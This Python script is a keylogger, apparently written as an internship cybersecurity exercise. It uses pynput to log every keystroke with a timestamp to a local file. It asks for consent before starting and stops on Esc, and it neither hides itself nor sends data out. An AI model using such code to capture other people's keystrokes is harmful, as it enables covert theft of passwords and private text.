from pynput import keyboard
from datetime import datetime
import threading
import os

log_file = "/Users/jayvaja/VS/Prodigy Infotech Internship/PRODIGY_CS_04/keylog.txt"

def write_to_file(content):
    with open(log_file, "a") as log:
        log.write(content)

def on_press(key):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        write_to_file(f"{timestamp} - {key.char}\n")
    except AttributeError:
        if key == keyboard.Key.space:
            write_to_file(f"{timestamp} - [SPACE]\n")
        elif key == keyboard.Key.enter:
            write_to_file(f"{timestamp} - [ENTER]\n")
        else:
            write_to_file(f"{timestamp} - [{key}]\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()

def stop_keylogger():
    os._exit(0)

def get_user_consent():
    consent = input("Do you consent to start the keylogger? (yes/no): ")
    return consent.lower() == 'yes'

if __name__ == "__main__":
    if get_user_consent():
        threading.Thread(target=start_keylogger).start()
    else:
        print("User did not consent. Exiting.")
